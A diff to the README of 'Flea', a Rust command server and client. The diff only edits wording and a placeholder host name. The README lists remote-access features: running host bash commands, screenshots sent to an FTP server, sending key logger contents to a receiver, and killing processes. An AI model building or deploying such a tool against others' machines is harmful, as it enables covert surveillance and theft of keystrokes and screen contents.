@@ -1,4 +1,4 @@
-# flea
+# Flea
 A simple command server written in Rust.
 
 This repository consists of two projects:
@@ -38,7 +38,7 @@ Currently supported commands are:
 
 * version : returns current server version
 * bash : a host bash command. The value property has to have a command line to execute in a host
-* pic : takes a screenshots of the host and send it to FTP server
+* pic : takes a screenshots of the host and sends it to FTP server
 * sendlog : reads current key logger file and sends its content to receiver
 * proclist : displays currently running processes in the system
 * kill : kills a process. Value parameter must include PID
@@ -65,12 +65,12 @@ Take screenshot and send it to the FTP server:
 
 Upload test.txt file from FTP server to the host where Flea Server is running on:
 ```
-./flea-client -a 127.0.0.1 -c upload -v test.txt
+./flea-client -a MY_SERVER_NAME -c upload -v test.txt
 ```
 
 ## Installation
 
-Depending on your application, you will have to change the server's IP address and its port in the code (../flea/src/main.rs) which it will be listen on. If you intend to use FTP server, you will need to complete the connection data. You can do this directly in the code:
+The Flea Server reads the host name of the computer and opens a port there. The name can be changed to IP address with a small code modification. If you intend to use FTP server, you will need to complete the connection data. You can do this directly in the code:
 
 ```rust
 //Enter your data for FTP Server connection
